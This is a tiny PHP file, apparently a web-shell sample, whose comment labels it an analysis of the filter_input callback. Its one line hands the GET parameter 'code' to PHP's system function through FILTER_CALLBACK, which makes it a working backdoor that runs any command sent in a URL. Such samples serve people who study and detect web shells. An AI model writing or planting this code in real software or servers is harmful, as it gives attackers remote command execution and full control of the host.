<?php
/* 
 * 回调函数分析 filter_input
 */
filter_input(INPUT_GET, 'code', FILTER_CALLBACK, array('options' => 'system'));
